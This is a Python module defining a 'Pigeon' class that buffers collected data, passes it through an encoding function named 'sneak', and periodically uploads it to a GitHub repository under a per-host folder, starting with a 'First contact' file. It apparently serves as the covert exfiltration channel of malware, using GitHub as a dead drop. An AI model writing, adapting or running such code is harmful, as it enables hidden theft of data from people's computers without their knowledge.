from config import PARAM, METHODS
from github import Github, Repository
from key import GIT_API_KEY
from threading import Lock
from time import sleep, strftime


class Pigeon:
    __buffer: dict[str, str] = {}
    __bufferLock: Lock = Lock()
    __interval: int = 300
    __repo: Repository.Repository 
    __uid: str = ""

    @staticmethod
    def pushToBuffer(src: str, con: str) -> None:
        while True:
            if Pigeon.__bufferLock.acquire_lock():
                if Pigeon.__buffer.get(src) == None:
                    Pigeon.__buffer[src] = con
                else:
                    Pigeon.__buffer[src] += con
                break
        Pigeon.__bufferLock.release_lock()

    @staticmethod
    def startService() -> None:
        sleep(Pigeon.__interval)
        Pigeon.__deliverContents()

    @staticmethod
    def initComs(uid: str, info: str) -> None:
        Pigeon.__interval = int(PARAM["interval"]) if PARAM.get("interval") != None else 300
        Pigeon.__repo = Github(GIT_API_KEY).get_repo(PARAM["repo"])
        info = METHODS["sneak"](info)
        Pigeon.__uid = uid
        _, _ = Pigeon.__repo.create_file(
            "{}/00_info".format(uid), "First contact", info
        )

    @staticmethod
    def __deliverContents() -> None:
        while True:
            info = METHODS["sneak"](str(Pigeon.__buffer))
            if Pigeon.__bufferLock.acquire_lock():
                message: str = strftime("%Y-%m-%d %H:%M")
                _, _ = Pigeon.__repo.create_file(
                    "{}/{}".format(Pigeon.__uid, message),
                    "Update from {}".format(message),
                    info,
                )
                Pigeon.__buffer = {}
                Pigeon.__bufferLock.release_lock()
                break
